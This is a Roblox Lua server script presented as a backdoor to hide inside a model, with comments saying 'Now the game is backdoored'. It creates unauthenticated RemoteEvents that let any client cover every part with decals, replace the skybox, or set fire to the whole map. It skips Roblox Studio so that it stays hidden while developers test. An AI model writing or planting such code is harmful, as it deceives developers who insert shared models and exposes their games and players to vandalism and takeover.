if not game:GetService('RunService'):IsStudio() then local ReplicatedStorage, RunService, Workspace, Lighting = game:GetService("ReplicatedStorage"), game:GetService('RunService'), game:GetService('Workspace'), game:GetService('Lighting') local A, B, C = Instance.new("RemoteEvent"), Instance.new("RemoteEvent"), Instance.new('RemoteEvent') A.Name, A.Parent, B.Name, B.Parent, C.Name, C.Parent = "CulEvent2", ReplicatedStorage, "CulEvent", ReplicatedStorage, "CulEvent3", ReplicatedStorage ReplicatedStorage:WaitForChild('CulEvent2').OnServerEvent:Connect(function() for _, v in ipairs(Workspace:GetDescendants()) do if v:IsA('BasePart') then for _, face in ipairs(Enum.NormalId:GetEnumItems()) do local decal = Instance.new('Decal') decal.Parent, decal.Texture, decal.Face = v, 'http://www.roblox.com/asset/?id=10560525674', face end end end end) ReplicatedStorage:WaitForChild('CulEvent').OnServerEvent:Connect(function() local sky = Instance.new('Sky', Lighting) local skyboxID = 'http://www.roblox.com/asset/?id=10560525674' for _, face in ipairs({'SkyboxBk', 'SkyboxDn', 'SkyboxFt', 'SkyboxLf', 'SkyboxRt', 'SkyboxUp'}) do sky[face] = skyboxID end end) ReplicatedStorage:WaitForChild('CulEvent3').OnServerEvent:Connect(function() for _, v in pairs(Workspace:GetDescendants()) do if v:IsA('BasePart') then local fire = Instance.new('Fire') fire.Parent = v end end end) end
--Put This inside of a model
-- make it a Script not a LocalScript, ModuleScripts etc
-- Now the game is backdoored
-- Updated so that it uses is not instudio method
